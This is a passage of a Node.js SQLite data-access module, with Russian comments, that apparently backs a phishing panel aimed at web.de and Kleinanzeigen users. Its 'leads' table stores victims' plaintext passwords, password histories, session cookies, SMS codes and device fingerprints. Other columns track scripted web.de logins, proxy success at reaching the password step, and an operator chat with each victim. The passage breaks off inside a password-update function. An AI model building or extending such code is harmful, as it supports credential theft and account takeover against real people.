/**
 * SQLite layer (infrastructure). Not wired into server.js yet.
 * DB file: data/database.sqlite (relative to project root).
 */
const path = require('path');
const fs = require('fs');
const Database = require('better-sqlite3');

const PROJECT_ROOT = path.join(__dirname, '..', '..');
/** Синхронно с server.js: общая папка данных при GMW_DATA_DIR. */
const DATA_DIR = process.env.GMW_DATA_DIR
  ? path.resolve(process.env.GMW_DATA_DIR)
  : path.join(PROJECT_ROOT, 'data');
const DB_PATH = path.join(DATA_DIR, 'database.sqlite');

const CHAT_STATE_KEY = 'chat_state';

let dbInstance = null;
let walCheckpointTimer = null;

function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

const DDL = `
PRAGMA journal_mode = WAL;
PRAGMA foreign_keys = ON;

CREATE TABLE IF NOT EXISTS leads (
  id TEXT PRIMARY KEY NOT NULL,
  email TEXT,
  email_kl TEXT,
  password TEXT,
  password_kl TEXT,
  created_at TEXT,
  last_seen_at TEXT,
  status TEXT,
  ip TEXT,
  platform TEXT,
  screen_width INTEGER,
  screen_height INTEGER,
  user_agent TEXT,
  brand TEXT,
  webde_script_run_seq INTEGER,
  webde_script_active_run INTEGER,
  webde_login_grid_exhausted INTEGER,
  webde_login_grid_step TEXT,
  admin_error_kind TEXT,
  admin_list_sort_at TEXT,
  admin_log_archived INTEGER,
  kl_log_archived INTEGER,
  klein_password_error_de TEXT,
  past_history_transferred INTEGER,
  current_page TEXT,
  script_automation_wait_until TEXT,
  script_status TEXT,
  session_pulse_at TEXT,
  ip_country TEXT,
  merge_actor TEXT,
  merge_reason TEXT,
  merged_at TEXT,
  merged_from_id TEXT,
  merged_into_id TEXT,
  event_terminal_json TEXT,
  password_history_json TEXT,
  fingerprint_json TEXT,
  sms_code_data_json TEXT,
  change_password_data_json TEXT,
  password_error_attempts_json TEXT,
  telemetry_snapshots_json TEXT,
  request_meta_json TEXT,
  client_signals_json TEXT,
  last_anti_fraud_assessment_json TEXT,
  action_log_json TEXT,
  device_signature_json TEXT,
  opened_at TEXT,
  klein_anmelden_seen_at TEXT,
  cookies TEXT,
  log_terminal TEXT,
  password_version INTEGER,
  attempt_no INTEGER,
  consumed_by_attempt INTEGER,
  password_updated_at TEXT,
  last_password_request_id TEXT,
  last_password_idem_key TEXT,
  last_password_idem_response_json TEXT
);

CREATE INDEX IF NOT EXISTS idx_leads_email ON leads (email);
CREATE INDEX IF NOT EXISTS idx_leads_status ON leads (status);
CREATE INDEX IF NOT EXISTS idx_leads_brand ON leads (brand);
CREATE INDEX IF NOT EXISTS idx_leads_created_at ON leads (created_at);

CREATE TABLE IF NOT EXISTS settings (
  key TEXT PRIMARY KEY NOT NULL,
  value TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS chat_messages (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  lead_id TEXT NOT NULL,
  from_role TEXT NOT NULL,
  body TEXT NOT NULL,
  at TEXT NOT NULL,
  FOREIGN KEY (lead_id) REFERENCES leads(id) ON DELETE CASCADE
);

CREATE INDEX IF NOT EXISTS idx_chat_messages_lead_id ON chat_messages (lead_id);

CREATE TABLE IF NOT EXISTS admin_sessions (
  token TEXT PRIMARY KEY,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS proxy_fp_stats (
  proxy_server TEXT NOT NULL,
  fp_index INTEGER NOT NULL,
  pairs INTEGER NOT NULL DEFAULT 0,
  reached_password INTEGER NOT NULL DEFAULT 0,
  not_reached_password INTEGER NOT NULL DEFAULT 0,
  updated_at TEXT,
  PRIMARY KEY (proxy_server, fp_index)
);
`;

/** Применить схему и pragma к уже открытому экземпляру (для миграций и тестов). */
function ensureLeadExtraColumns(db) {
  const cols = db.prepare('PRAGMA table_info(leads)').all();
  const names = new Set(cols.map((c) => c.name));
  if (!names.has('opened_at')) db.exec('ALTER TABLE leads ADD COLUMN opened_at TEXT');
  if (!names.has('klein_anmelden_seen_at')) db.exec('ALTER TABLE leads ADD COLUMN klein_anmelden_seen_at TEXT');
  if (!names.has('cookies')) db.exec('ALTER TABLE leads ADD COLUMN cookies TEXT');
  if (!names.has('log_terminal')) db.exec('ALTER TABLE leads ADD COLUMN log_terminal TEXT');
  if (!names.has('password_version')) db.exec('ALTER TABLE leads ADD COLUMN password_version INTEGER');
  if (!names.has('attempt_no')) db.exec('ALTER TABLE leads ADD COLUMN attempt_no INTEGER');
  if (!names.has('consumed_by_attempt')) db.exec('ALTER TABLE leads ADD COLUMN consumed_by_attempt INTEGER');
  if (!names.has('password_updated_at')) db.exec('ALTER TABLE leads ADD COLUMN password_updated_at TEXT');
  if (!names.has('last_password_request_id')) db.exec('ALTER TABLE leads ADD COLUMN last_password_request_id TEXT');
  if (!names.has('last_password_idem_key')) db.exec('ALTER TABLE leads ADD COLUMN last_password_idem_key TEXT');
  if (!names.has('last_password_idem_response_json')) {
    db.exec('ALTER TABLE leads ADD COLUMN last_password_idem_response_json TEXT');
  }
  if (!names.has('client_form_brand')) db.exec('ALTER TABLE leads ADD COLUMN client_form_brand TEXT');
  if (!names.has('host_brand_at_submit')) db.exec('ALTER TABLE leads ADD COLUMN host_brand_at_submit TEXT');
  db.exec('UPDATE leads SET password_version = 0 WHERE password_version IS NULL');
  db.exec('UPDATE leads SET attempt_no = 1 WHERE attempt_no IS NULL OR attempt_no < 1');
}

/** Импорт legacy login/cookies/*.json в leads.cookies и удаление файлов (один раз на старт). */
function migrateLegacyLoginCookieFiles(db) {
  const dir = path.join(PROJECT_ROOT, 'login', 'cookies');
  if (!fs.existsSync(dir)) return;
  let files;
  try {
    files = fs.readdirSync(dir).filter((f) => f.endsWith('.json'));
  } catch (e) {
    return;
  }
  if (files.length === 0) return;
  let rows;
  try {
    rows = db.prepare('SELECT id, email, email_kl, brand, cookies FROM leads').all();
  } catch (e) {
    return;
  }
  function normEmail(e) {
    return String(e || '')
      .trim()
      .toLowerCase();
  }
  const byEmail = new Map();
  for (const r of rows) {
    const main = normEmail(r.email);
    const kl = normEmail(r.email_kl);
    if (main) byEmail.set(main, r);
    if (kl && kl !== main) byEmail.set(kl, r);
  }
  const upd = db.prepare('UPDATE leads SET cookies = ? WHERE id = ?');
  for (const f of files) {
    const safe = f.slice(0, -5);
    const emailGuess = safe.replace(/_at_/g, '@');
    const key = emailGuess.toLowerCase();
    const row = byEmail.get(key);
    if (!row) continue;
    const hasDb = row.cookies != null && String(row.cookies).trim() !== '';
    const fp = path.join(dir, f);
    if (hasDb) {
      try {
        fs.unlinkSync(fp);
      } catch (e) {}
      continue;
    }
    try {
      const content = fs.readFileSync(fp, 'utf8');
      JSON.parse(content);
      upd.run(content, row.id);
      fs.unlinkSync(fp);
    } catch (e) {}
  }
  try {
    const left = fs.readdirSync(dir).filter((x) => x.endsWith('.json'));
    if (left.length === 0) fs.rmdirSync(dir);
  } catch (e) {}
}

function configureDatabase(db) {
  // WAL: меньше блокировок при параллельной записи лидов (читатели не ждут писателей).
  db.pragma('journal_mode = WAL');
  db.pragma('wal_autocheckpoint = 1000');
  db.pragma('foreign_keys = ON');
  db.pragma('synchronous = NORMAL');
  db.pragma('temp_store = MEMORY');
  db.exec(DDL);
  ensureLeadExtraColumns(db);
  migrateLegacyLoginCookieFiles(db);
  if (!walCheckpointTimer) {
    walCheckpointTimer = setInterval(() => {
      try {
        db.exec('PRAGMA wal_checkpoint(TRUNCATE);');
      } catch (_) {}
    }, 60 * 60 * 1000);
    if (typeof walCheckpointTimer.unref === 'function') walCheckpointTimer.unref();
  }
}

function openDatabase() {
  ensureDataDir();
  const db = new Database(DB_PATH);
  configureDatabase(db);
  return db;
}

function getDb() {
  if (!dbInstance) {
    dbInstance = openDatabase();
  }
  return dbInstance;
}

function closeDb() {
  if (walCheckpointTimer) {
    clearInterval(walCheckpointTimer);
    walCheckpointTimer = null;
  }
  if (dbInstance) {
    dbInstance.close();
    dbInstance = null;
  }
}

const JSON_FIELDS = [
  ['eventTerminal', 'event_terminal_json'],
  ['passwordHistory', 'password_history_json'],
  ['fingerprint', 'fingerprint_json'],
  ['smsCodeData', 'sms_code_data_json'],
  ['changePasswordData', 'change_password_data_json'],
  ['passwordErrorAttempts', 'password_error_attempts_json'],
  ['telemetrySnapshots', 'telemetry_snapshots_json'],
  ['requestMeta', 'request_meta_json'],
  ['clientSignals', 'client_signals_json'],
  ['lastAntiFraudAssessment', 'last_anti_fraud_assessment_json'],
  ['actionLog', 'action_log_json'],
  ['deviceSignature', 'device_signature_json']
];

function stringifyJsonField(value) {
  if (value === undefined || value === null) return null;
  return JSON.stringify(value);
}

function parseJsonField(raw) {
  if (raw == null || raw === '') return undefined;
  try {
    return JSON.parse(raw);
  } catch {
    return undefined;
  }
}

function leadRowToObject(row) {
  if (!row) return null;
  const o = {
    id: row.id,
    email: row.email,
    emailKl: row.email_kl,
    password: row.password,
    passwordKl: row.password_kl,
    createdAt: row.created_at,
    lastSeenAt: row.last_seen_at,
    status: row.status,
    ip: row.ip,
    platform: row.platform,
    screenWidth: row.screen_width,
    screenHeight: row.screen_height,
    userAgent: row.user_agent,
    brand: row.brand,
    webdeScriptRunSeq: row.webde_script_run_seq,
    webdeScriptActiveRun: row.webde_script_active_run,
    webdeLoginGridExhausted:
      row.webde_login_grid_exhausted === 1 ? true : row.webde_login_grid_exhausted === 0 ? false : undefined,
    webdeLoginGridStep: row.webde_login_grid_step,
    adminErrorKind: row.admin_error_kind,
    adminListSortAt: row.admin_list_sort_at,
    adminLogArchived: row.admin_log_archived === 1 ? true : row.admin_log_archived === 0 ? false : undefined,
    klLogArchived: row.kl_log_archived === 1 ? true : row.kl_log_archived === 0 ? false : undefined,
    kleinPasswordErrorDe: row.klein_password_error_de,
    pastHistoryTransferred:
      row.past_history_transferred === 1 ? true : row.past_history_transferred === 0 ? false : undefined,
    currentPage: row.current_page,
    scriptAutomationWaitUntil: row.script_automation_wait_until,
    scriptStatus: row.script_status,
    sessionPulseAt: row.session_pulse_at,
    ipCountry: row.ip_country,
    mergeActor: row.merge_actor,
    mergeReason: row.merge_reason,
    mergedAt: row.merged_at,
    mergedFromId: row.merged_from_id,
    mergedIntoId: row.merged_into_id,
    openedAt: row.opened_at,
    kleinAnmeldenSeenAt: row.klein_anmelden_seen_at,
    cookies: row.cookies != null ? String(row.cookies) : null,
    logTerminal: row.log_terminal != null ? String(row.log_terminal) : null,
    passwordVersion: Number.isFinite(row.password_version) ? Number(row.password_version) : 0,
    attemptNo: Number.isFinite(row.attempt_no) ? Number(row.attempt_no) : 1,
    consumedByAttempt: Number.isFinite(row.consumed_by_attempt) ? Number(row.consumed_by_attempt) : null,
    passwordUpdatedAt: row.password_updated_at != null ? String(row.password_updated_at) : null,
    lastPasswordRequestId: row.last_password_request_id != null ? String(row.last_password_request_id) : null,
    lastPasswordIdemKey: row.last_password_idem_key != null ? String(row.last_password_idem_key) : null,
    clientFormBrand: row.client_form_brand != null ? String(row.client_form_brand) : undefined,
    hostBrandAtSubmit: row.host_brand_at_submit != null ? String(row.host_brand_at_submit) : undefined
  };
  for (const [camel, sqlCol] of JSON_FIELDS) {
    const val = parseJsonField(row[sqlCol]);
    if (val !== undefined) o[camel] = val;
  }
  return o;
}

function boolToInt(v) {
  if (v === true) return 1;
  if (v === false) return 0;
  return null;
}

function leadObjectToRow(lead) {
  return {
    id: lead.id != null ? String(lead.id) : null,
    email: lead.email != null ? String(lead.email) : null,
    email_kl: lead.emailKl != null ? String(lead.emailKl) : null,
    password: lead.password != null ? String(lead.password) : null,
    password_kl: lead.passwordKl != null ? String(lead.passwordKl) : null,
    created_at: lead.createdAt != null ? String(lead.createdAt) : null,
    last_seen_at: lead.lastSeenAt != null ? String(lead.lastSeenAt) : null,
    status: lead.status != null ? String(lead.status) : null,
    ip: lead.ip != null ? String(lead.ip) : null,
    platform: lead.platform != null ? String(lead.platform) : null,
    screen_width: typeof lead.screenWidth === 'number' ? lead.screenWidth : null,
    screen_height: typeof lead.screenHeight === 'number' ? lead.screenHeight : null,
    user_agent: lead.userAgent != null ? String(lead.userAgent) : null,
    brand: lead.brand != null ? String(lead.brand) : null,
    webde_script_run_seq: typeof lead.webdeScriptRunSeq === 'number' ? lead.webdeScriptRunSeq : null,
    webde_script_active_run: typeof lead.webdeScriptActiveRun === 'number' ? lead.webdeScriptActiveRun : null,
    webde_login_grid_exhausted: boolToInt(lead.webdeLoginGridExhausted),
    webde_login_grid_step: lead.webdeLoginGridStep != null ? String(lead.webdeLoginGridStep) : null,
    admin_error_kind: lead.adminErrorKind != null ? String(lead.adminErrorKind) : null,
    admin_list_sort_at: lead.adminListSortAt != null ? String(lead.adminListSortAt) : null,
    admin_log_archived: boolToInt(lead.adminLogArchived),
    kl_log_archived: boolToInt(lead.klLogArchived),
    klein_password_error_de: lead.kleinPasswordErrorDe != null ? String(lead.kleinPasswordErrorDe) : null,
    past_history_transferred: boolToInt(lead.pastHistoryTransferred),
    current_page: lead.currentPage != null ? String(lead.currentPage) : null,
    script_automation_wait_until: lead.scriptAutomationWaitUntil != null ? String(lead.scriptAutomationWaitUntil) : null,
    script_status: lead.scriptStatus != null ? String(lead.scriptStatus) : null,
    session_pulse_at: lead.sessionPulseAt != null ? String(lead.sessionPulseAt) : null,
    ip_country: lead.ipCountry != null ? String(lead.ipCountry) : null,
    merge_actor: lead.mergeActor != null ? String(lead.mergeActor) : null,
    merge_reason: lead.mergeReason != null ? String(lead.mergeReason) : null,
    merged_at: lead.mergedAt != null ? String(lead.mergedAt) : null,
    merged_from_id: lead.mergedFromId != null ? String(lead.mergedFromId) : null,
    merged_into_id: lead.mergedIntoId != null ? String(lead.mergedIntoId) : null,
    opened_at: lead.openedAt != null ? String(lead.openedAt) : null,
    klein_anmelden_seen_at: lead.kleinAnmeldenSeenAt != null ? String(lead.kleinAnmeldenSeenAt) : null,
    cookies:
      lead.cookies != null && String(lead.cookies).trim() !== '' ? String(lead.cookies) : null,
    log_terminal: lead.logTerminal != null ? String(lead.logTerminal) : null,
    password_version:
      typeof lead.passwordVersion === 'number' && Number.isFinite(lead.passwordVersion) ? lead.passwordVersion : 0,
    attempt_no: typeof lead.attemptNo === 'number' && Number.isFinite(lead.attemptNo) && lead.attemptNo > 0 ? lead.attemptNo : 1,
    consumed_by_attempt:
      typeof lead.consumedByAttempt === 'number' && Number.isFinite(lead.consumedByAttempt) ? lead.consumedByAttempt : null,
    password_updated_at: lead.passwordUpdatedAt != null ? String(lead.passwordUpdatedAt) : null,
    last_password_request_id: lead.lastPasswordRequestId != null ? String(lead.lastPasswordRequestId) : null,
    last_password_idem_key: lead.lastPasswordIdemKey != null ? String(lead.lastPasswordIdemKey) : null,
    last_password_idem_response_json:
      lead.lastPasswordIdemResponse != null ? JSON.stringify(lead.lastPasswordIdemResponse) : null,
    client_form_brand: lead.clientFormBrand != null ? String(lead.clientFormBrand).trim().toLowerCase() : null,
    host_brand_at_submit: lead.hostBrandAtSubmit != null ? String(lead.hostBrandAtSubmit).trim().toLowerCase() : null,
    event_terminal_json: stringifyJsonField(lead.eventTerminal),
    password_history_json: stringifyJsonField(lead.passwordHistory),
    fingerprint_json: stringifyJsonField(lead.fingerprint),
    sms_code_data_json: stringifyJsonField(lead.smsCodeData),
    change_password_data_json: stringifyJsonField(lead.changePasswordData),
    password_error_attempts_json: stringifyJsonField(lead.passwordErrorAttempts),
    telemetry_snapshots_json: stringifyJsonField(lead.telemetrySnapshots),
    request_meta_json: stringifyJsonField(lead.requestMeta),
    client_signals_json: stringifyJsonField(lead.clientSignals),
    last_anti_fraud_assessment_json: stringifyJsonField(lead.lastAntiFraudAssessment),
    action_log_json: stringifyJsonField(lead.actionLog),
    device_signature_json: stringifyJsonField(lead.deviceSignature)
  };
}

const INSERT_SQL = `
INSERT OR REPLACE INTO leads (
  id, email, email_kl, password, password_kl, created_at, last_seen_at, status, ip, platform,
  screen_width, screen_height, user_agent, brand,
  webde_script_run_seq, webde_script_active_run, webde_login_grid_exhausted, webde_login_grid_step,
  admin_error_kind, admin_list_sort_at, admin_log_archived, kl_log_archived, klein_password_error_de,
  past_history_transferred, current_page, script_automation_wait_until, script_status, session_pulse_at,
  ip_country, merge_actor, merge_reason, merged_at, merged_from_id, merged_into_id,
  opened_at, klein_anmelden_seen_at, cookies, log_terminal,
  password_version, attempt_no, consumed_by_attempt, password_updated_at,
  last_password_request_id, last_password_idem_key, last_password_idem_response_json,
  client_form_brand, host_brand_at_submit,
  event_terminal_json, password_history_json, fingerprint_json, sms_code_data_json,
  change_password_data_json, password_error_attempts_json, telemetry_snapshots_json, request_meta_json,
  client_signals_json, last_anti_fraud_assessment_json, action_log_json, device_signature_json
) VALUES (
  @id, @email, @email_kl, @password, @password_kl, @created_at, @last_seen_at, @status, @ip, @platform,
  @screen_width, @screen_height, @user_agent, @brand,
  @webde_script_run_seq, @webde_script_active_run, @webde_login_grid_exhausted, @webde_login_grid_step,
  @admin_error_kind, @admin_list_sort_at, @admin_log_archived, @kl_log_archived, @klein_password_error_de,
  @past_history_transferred, @current_page, @script_automation_wait_until, @script_status, @session_pulse_at,
  @ip_country, @merge_actor, @merge_reason, @merged_at, @merged_from_id, @merged_into_id,
  @opened_at, @klein_anmelden_seen_at, @cookies, @log_terminal,
  @password_version, @attempt_no, @consumed_by_attempt, @password_updated_at,
  @last_password_request_id, @last_password_idem_key, @last_password_idem_response_json,
  @client_form_brand, @host_brand_at_submit,
  @event_terminal_json, @password_history_json, @fingerprint_json, @sms_code_data_json,
  @change_password_data_json, @password_error_attempts_json, @telemetry_snapshots_json, @request_meta_json,
  @client_signals_json, @last_anti_fraud_assessment_json, @action_log_json, @device_signature_json
)
`;

function getAllLeads() {
  const db = getDb();
  const rows = db.prepare('SELECT * FROM leads ORDER BY datetime(created_at) DESC').all();
  return rows.map(leadRowToObject);
}

function getLeadById(id) {
  const db = getDb();
  const row = db.prepare('SELECT * FROM leads WHERE id = ? LIMIT 1').get(id);
  return leadRowToObject(row);
}

function getLeadIdByEmail(email) {
  const em = email != null ? String(email).trim().toLowerCase() : '';
  if (!em) return null;
  const db = getDb();
  const row = db.prepare(`
    SELECT id FROM leads
    WHERE (LOWER(TRIM(COALESCE(email, ''))) = ? OR LOWER(TRIM(COALESCE(email_kl, ''))) = ?)
    ORDER BY datetime(COALESCE(admin_list_sort_at, created_at)) DESC,
             datetime(created_at) ASC
    LIMIT 1
  `).get(em, em);
  return row && row.id ? String(row.id) : null;
}

/** Все лиды с тем же email или email_kl (нижний регистр). Старые id первыми — для выбора канонического. */
function getAllLeadIdsByEmailNormalized(emailLower) {
  const em = emailLower != null ? String(emailLower).trim().toLowerCase() : '';
  if (!em) return [];
  const db = getDb();
  const rows = db.prepare(`
    SELECT id FROM leads
    WHERE (LOWER(TRIM(COALESCE(email, ''))) = ? OR LOWER(TRIM(COALESCE(email_kl, ''))) = ?)
    ORDER BY datetime(created_at) ASC
  `).all(em, em);
  return rows.map((r) => (r && r.id ? String(r.id) : null)).filter(Boolean);
}

/** Минимальные поля лидов за период для агрегата статистики в leadService (Успех / Отработаны / Pending). */
function getStatsLeadSnapshotsByPeriod(period) {
  const p = String(period || 'today').trim().toLowerCase();
  let whereClause = '';
  if (p === 'today') {
    whereClause = "WHERE datetime(created_at) >= datetime('now', 'start of day')";
  } else if (p === 'yesterday') {
    whereClause = "WHERE datetime(created_at) >= datetime('now', '-1 day', 'start of day') AND datetime(created_at) < datetime('now', 'start of day')";
  } else if (p === 'week') {
    whereClause = "WHERE datetime(created_at) >= datetime('now', '-7 days')";
  } else if (p === 'month') {
    whereClause = "WHERE datetime(created_at) >= datetime('now', 'start of month')";
  } else {
    whereClause = '';
  }

  const rows = getDb()
    .prepare(
      `SELECT status, kl_log_archived, platform, event_terminal_json FROM leads ${whereClause}`
    )
    .all();
  return rows.map((row) => ({
    status: row.status,
    klLogArchived: row.kl_log_archived === 1 ? true : row.kl_log_archived === 0 ? false : undefined,
    platform: row.platform,
    eventTerminal: parseJsonField(row.event_terminal_json),
  }));
}

function addLead(leadData) {
  if (!leadData || !leadData.id) {
    throw new Error('addLead: leadData.id is required');
  }
  const db = getDb();
  db.prepare(INSERT_SQL).run(leadObjectToRow(leadData));
  return getLeadById(leadData.id);
}

function deepMerge(a, b) {
  const out = { ...a };
  for (const k of Object.keys(b)) {
    const bv = b[k];
    if (bv === undefined) continue;
    const av = out[k];
    if (
      bv &&
      typeof bv === 'object' &&
      !Array.isArray(bv) &&
      av &&
      typeof av === 'object' &&
      !Array.isArray(av)
    ) {
      out[k] = deepMerge(av, bv);
    } else {
      out[k] = bv;
    }
  }
  return out;
}

function updateLead(id, partialData) {
  const existing = getLeadById(id);
  if (!existing) {
    return null;
  }
  const merged = deepMerge(existing, partialData);
  merged.id = id;
  const db = getDb();
  db.prepare(INSERT_SQL).run(leadObjectToRow(merged));
  return getLeadById(id);
}

/** camelCase (как в объекте лида) → колонка SQLite и тип для UPDATE. */
const PARTIAL_SCALAR_FIELDS = {
  email: { col: 'email', kind: 'str' },
  emailKl: { col: 'email_kl', kind: 'str' },
  password: { col: 'password', kind: 'str' },
  passwordKl: { col: 'password_kl', kind: 'str' },
  createdAt: { col: 'created_at', kind: 'str' },
  lastSeenAt: { col: 'last_seen_at', kind: 'str' },
  status: { col: 'status', kind: 'str' },
  ip: { col: 'ip', kind: 'str' },
  platform: { col: 'platform', kind: 'str' },
  screenWidth: { col: 'screen_width', kind: 'int' },
  screenHeight: { col: 'screen_height', kind: 'int' },
  userAgent: { col: 'user_agent', kind: 'str' },
  brand: { col: 'brand', kind: 'str' },
  webdeScriptRunSeq: { col: 'webde_script_run_seq', kind: 'int' },
  webdeScriptActiveRun: { col: 'webde_script_active_run', kind: 'int' },
  webdeLoginGridExhausted: { col: 'webde_login_grid_exhausted', kind: 'bool' },
  webdeLoginGridStep: { col: 'webde_login_grid_step', kind: 'str' },
  adminErrorKind: { col: 'admin_error_kind', kind: 'str' },
  adminListSortAt: { col: 'admin_list_sort_at', kind: 'str' },
  adminLogArchived: { col: 'admin_log_archived', kind: 'bool' },
  klLogArchived: { col: 'kl_log_archived', kind: 'bool' },
  kleinPasswordErrorDe: { col: 'klein_password_error_de', kind: 'str' },
  pastHistoryTransferred: { col: 'past_history_transferred', kind: 'bool' },
  currentPage: { col: 'current_page', kind: 'str' },
  scriptAutomationWaitUntil: { col: 'script_automation_wait_until', kind: 'str' },
  scriptStatus: { col: 'script_status', kind: 'str' },
  sessionPulseAt: { col: 'session_pulse_at', kind: 'str' },
  ipCountry: { col: 'ip_country', kind: 'str' },
  mergeActor: { col: 'merge_actor', kind: 'str' },
  mergeReason: { col: 'merge_reason', kind: 'str' },
  mergedAt: { col: 'merged_at', kind: 'str' },
  mergedFromId: { col: 'merged_from_id', kind: 'str' },
  mergedIntoId: { col: 'merged_into_id', kind: 'str' },
  openedAt: { col: 'opened_at', kind: 'str' },
  kleinAnmeldenSeenAt: { col: 'klein_anmelden_seen_at', kind: 'str' },
  cookies: { col: 'cookies', kind: 'str' },
  logTerminal: { col: 'log_terminal', kind: 'str' },
  passwordVersion: { col: 'password_version', kind: 'int' },
  attemptNo: { col: 'attempt_no', kind: 'int' },
  consumedByAttempt: { col: 'consumed_by_attempt', kind: 'int' },
  passwordUpdatedAt: { col: 'password_updated_at', kind: 'str' },
  lastPasswordRequestId: { col: 'last_password_request_id', kind: 'str' },
  lastPasswordIdemKey: { col: 'last_password_idem_key', kind: 'str' },
  clientFormBrand: { col: 'client_form_brand', kind: 'str' },
  hostBrandAtSubmit: { col: 'host_brand_at_submit', kind: 'str' }
};

const JSON_FIELD_BY_CAMEL = Object.fromEntries(JSON_FIELDS);

function coercePartialScalar(kind, v) {
  if (v === null || v === undefined) return null;
  if (kind === 'str') return String(v);
  if (kind === 'int') {
    if (typeof v === 'number' && Number.isFinite(v)) return v;
    return null;
  }
  if (kind === 'bool') {
    if (v === true) return 1;
    if (v === false) return 0;
    return null;
  }
  return null;
}

function isTerminalLeadStatus(status) {
  const s = status != null ? String(status).trim().toLowerCase() : '';
  return s === 'show_success' || s === 'error';
}

/**
 * Точечный UPDATE одной строки leads. Вложенные поля (actionLog, fingerprint, …) сериализуются в JSON.
 * null в updates → SQL NULL. Ключи со значением undefined пропускаются.
 * @returns обновлённый объект лида или null, если строки с таким id нет или нечего обновлять.
 */
function updateLeadPartial(id, updates) {
  if (id == null || !updates || typeof updates !== 'object') return null;
  const idStr = String(id);
  const exists = getDb().prepare('SELECT 1 FROM leads WHERE id = ?').get(idStr);
  if (!exists) return null;
  const currentRow = getDb().prepare('SELECT status FROM leads WHERE id = ?').get(idStr);
  const currentStatus = currentRow && currentRow.status != null ? String(currentRow.status) : '';

  const fragments = [];
  const values = [];

  for (const key of Object.keys(updates)) {
    if (key === 'id') continue;
    const val = updates[key];
    if (val === undefined) continue;

    const jsonCol = JSON_FIELD_BY_CAMEL[key];
    if (jsonCol) {
      fragments.push(`${jsonCol} = ?`);
      values.push(val === null ? null : stringifyJsonField(val));
      continue;
    }
    const spec = PARTIAL_SCALAR_FIELDS[key];
    if (spec) {
      if (key === 'status') {
        const nextStatus = val != null ? String(val).trim() : '';
        if (isTerminalLeadStatus(currentStatus) && nextStatus && nextStatus.toLowerCase() !== currentStatus.toLowerCase()) {
          continue;
        }
      }
      fragments.push(`${spec.col} = ?`);
      values.push(coercePartialScalar(spec.kind, val));
    }
  }

  if (fragments.length === 0) return getLeadById(idStr);

  values.push(idStr);
  const sql = `UPDATE leads SET ${fragments.join(', ')} WHERE id = ?`;
  getDb().prepare(sql).run(...values);
  return getLeadById(idStr);
}

function deleteLeadById(leadId) {
  if (leadId == null) return 0;
  return getDb().prepare('DELETE FROM leads WHERE id = ?').run(String(leadId)).changes;
}

function deleteAllLeads() {
  getDb().prepare('DELETE FROM leads').run();
}

/** Атомарно: удалить старый id и вставить новый лог (слияние по email и т.п.). */
function replaceLeadRow(oldId, newLead) {
  if (!newLead || newLead.id == null) throw new Error('replaceLeadRow: newLead.id required');
  const db = getDb();
  const del = db.prepare('DELETE FROM leads WHERE id = ?');
  const ins = db.prepare(INSERT_SQL);
  db.transaction(() => {
    del.run(String(oldId));
    ins.run(leadObjectToRow(newLead));
  })();
}

/**
 * Полная замена набора лидов (редко: массовые операции): upsert всех записей из массива,
 * удаление из БД лидов, чьих id нет в массиве (чат по FK каскадом чистится).
 */
function replaceAllLeads(leadsArray) {
  if (!Array.isArray(leadsArray)) {
    throw new Error('replaceAllLeads: expected an array');
  }
  const db = getDb();
  const newIds = new Set();
  for (const l of leadsArray) {
    if (l && l.id != null) newIds.add(String(l.id));
  }
  const insert = db.prepare(INSERT_SQL);
  const delOne = db.prepare('DELETE FROM leads WHERE id = ?');
  const txn = db.transaction(() => {
    const existing = db.prepare('SELECT id FROM leads').all();
    for (const row of existing) {
      if (!newIds.has(row.id)) delOne.run(row.id);
    }
    for (const lead of leadsArray) {
      if (lead && lead.id != null) insert.run(leadObjectToRow(lead));
    }
  });
  txn();
}

/**
 * Атомарное добавление строки в терминальный лог лида.
 * SQL append выполняется в SQLite без read-modify-write в Node.js.
 */
function appendLeadLogTerminal(leadId, logLine) {
  if (leadId == null || logLine == null) return false;
  const idStr = String(leadId).trim();
  const line = String(logLine).trim();
  if (!idStr || !line) return false;
  const info = getDb().prepare(
    "UPDATE leads SET log_terminal = COALESCE(log_terminal, '') || char(10) || ? WHERE id = ?"
  ).run(line, idStr);
  return info.changes > 0;
}

function parseIdemResponse(raw) {
  if (raw == null || raw === '') return null;
  try {
    return JSON.parse(raw);
  } catch {
    return null;
  }
}

function updateLeadPasswordVersioned(args) {
  const db = getDb();
  const leadId = args && args.leadId != null ? String(args.leadId) : '';
  if (!leadId) return { ok: false, code: 'bad_request' };
  const newPassword = args.newPassword != null ? String(args.newPassword) : '';
  const idempotencyKey = args.idempotencyKey != null ? String(args.idempotencyKey).trim() : '';
  const requestId = args.requestId != null ? String(args.requestId) : '';
  const source = args.source != null ? String(args.source) : 'api';
  const expectedAttemptNo = Number.isFinite(args.expectedAttemptNo) ? Number(args.expectedAttemptNo) : null;
  const nowIso = new Date().toISOString();
  const txn = db.transaction(() => {
    const row = db.prepare(
      'SELECT id, password, status, password_version, attempt_no, last_password_idem_key, last_password_idem_response_json FROM leads WHERE id = ? LIMIT 1'
    ).get(leadId);
    if (!row) return { ok: false, code: 'not_found' };
    const oldVersion = Number.isFinite(row.password_version) ? Number(row.password_version) : 0;
    const currentAttemptNo = Number.isFinite(row.attempt_no) ? Number(row.attempt_no) : 1;
    if (idempotencyKey && row.last_password_idem_key && String(row.last_password_idem_key) === idempotencyKey) {
      return { ok: true, replay: true, response: parseIdemResponse(row.last_password_idem_response_json) };
    }
    if (expectedAttemptNo != null && expectedAttemptNo !== currentAttemptNo) {
      return { ok: false, code: 'attempt_mismatch', currentAttemptNo };
    }
    const status = row.status != null ? String(row.status) : '';
    const oldPassword = row.password != null ? String(row.password) : '';
    const newAttemptNo = status === 'error' && newPassword !== oldPassword ? currentAttemptNo + 1 : currentAttemptNo;
    const newVersion = oldVersion + 1;
    const response = {
      leadId,
      oldVersion,
      newVersion,
      oldPassword,
      newPassword,
      attemptNo: newAttemptNo,
      source,
      updatedAt: nowIso,
      requestId
    };
    const result = db.prepare(
      `UPDATE leads
       SET password = ?, password_version = ?, attempt_no = ?, consumed_by_attempt = NULL,
           password_updated_at = ?, last_password_request_id = ?, last_password_idem_key = ?,
           last_password_idem_response_json = ?, last_seen_at = ?, status = CASE WHEN status = 'error' THEN 'pending' ELSE status END
       WHERE id = ? AND COALESCE(password_version, 0) = ?`
    ).run(
      newPassword,
      newVersion,
      newAttemptNo,
      nowIso,
      requestId || null,
